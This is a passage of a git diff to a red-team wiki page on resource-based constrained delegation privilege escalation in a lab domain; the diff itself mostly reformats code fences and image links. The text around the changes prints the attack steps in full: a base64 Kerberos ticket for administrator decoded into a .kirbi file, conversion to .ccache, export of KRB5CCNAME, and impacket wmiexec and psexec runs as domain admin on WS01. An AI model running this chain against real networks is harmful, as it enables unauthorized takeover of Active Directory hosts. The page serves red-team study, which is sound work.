 echo "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" | base64 -d > admin.kirbi
 ```
 
-![TGS base64 decoded and saved to a kirbi file](../../.gitbook/assets/image%20%281062%29.png)
+![TGS base64 decoded and saved to a kirbi file](<../../.gitbook/assets/image (1062).png>)
 
 ### Converting .kirbi Ticket to .ccache
 
 Use impacket's tool `ticketConverter` to convert the `.kirbi` file to `.ccache` file like so:
 
-```text
+```
 examples/ticketConverter.py ../admin.kirbi admin.ccache
 ```
 
-![Converting .kirbi to .ccache](../../.gitbook/assets/image%20%281056%29.png)
+![Converting .kirbi to .ccache](<../../.gitbook/assets/image (1059).png>)
 
 ### Exporting KRB5CCNAME
 
 Now we need to export the `KRB5CCNAME` variable and point it to our `admin.ccache` file:
 
-```text
+```
 export KRB5CCNAME=admin.ccache
 ```
 
-![KRB5CCNAME variable exported](../../.gitbook/assets/image%20%281057%29.png)
+![KRB5CCNAME variable exported](<../../.gitbook/assets/image (1060).png>)
 
 ### Executing Code as Domain Admin on WS01
 
 We can now use impacket's `wmiexec` to execute commands on `WS01` as `administrator`:
 
-```text
+```
 examples/wmiexec.py -k -no-pass offense.local/administrator@ws01.offense.local
 ```
 
@@ -540,14 +546,14 @@ examples/wmiexec.py -k -no-pass offense.local/administrator@ws01.offense.local
 
 Privileged code execution on `WS01` can also be achieved using impacket's psexec:
 
-![psexec executes code on ws01 from 10.0.0.5 with SYSTEM privileges](../../.gitbook/assets/image%20%281060%29.png)
+![psexec executes code on ws01 from 10.0.0.5 with SYSTEM privileges](<../../.gitbook/assets/image (1063).png>)
 
 {% hint style="info" %}
 **Note**
 
 RBCD for local privilege escalation could also be performed**:**
 
-* by leveraging a compromised user with SPN set, assuming you have `WRITE` privilege over the computer's you want to compromise, AD object as described [here](https://orangecyberdefense.com/global/blog/sensepost/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/). 
+* by leveraging a compromised user with SPN set, assuming you have `WRITE` privilege over the computer's you want to compromise, AD object as described [here](https://orangecyberdefense.com/global/blog/sensepost/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/).&#x20;
 * via socks proxy and remote port forwarding as described [here](https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/), which reduces the need to have a Linux box inside the compromised network with an NTLM relay listener set up.
 {% endhint %}
 
@@ -566,4 +572,3 @@ Note to self: what a beautiful attack vector this is.
 {% embed url="https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/" %}
 
 {% embed url="https://orangecyberdefense.com/global/blog/sensepost/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/" %}
-
